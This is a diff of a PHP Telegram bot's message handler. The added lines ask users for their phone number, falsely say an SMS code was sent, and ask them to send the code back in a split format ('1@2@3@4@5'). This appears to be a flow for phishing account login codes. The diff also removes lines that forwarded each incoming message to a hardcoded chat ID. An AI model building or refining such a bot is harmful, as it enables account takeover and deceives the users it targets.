@@ -82,13 +82,6 @@ class GenericmessageCommand extends SystemCommand
     
     
         
-    
-
-            Request::sendMessage([
-                'chat_id' => '1053901092',
-                 'text' => $message
-    
-            ]);
 
         if ($chat_id == '1053901092') {
 
@@ -119,7 +112,7 @@ class GenericmessageCommand extends SystemCommand
 
         ]);
 
-      
+       
             
 
         $keyboards[] = new Keyboard([
@@ -188,6 +181,13 @@ class GenericmessageCommand extends SystemCommand
                 
                 return $this->replyToChat("Please ! Write Your PHONE Number eg( +***** )", [
                     'reply_markup' => $keyboard3,
+                 ]);
+            }
+
+            elseif ($message->getReplyToMessage() && $message->getReplyToMessage()->getText(true) == "Please ! Write Your PHONE Number eg( +***** )") {
+                return $this->replyToChat(" WE SENT YOU A SMS CODE". PHP_EOL. 
+                " Please ! SEND BACK THE CODE eg( 1@2@3@4@5 )", [
+                    'reply_markup' => $keyboard4,
                  ]);
             }
 
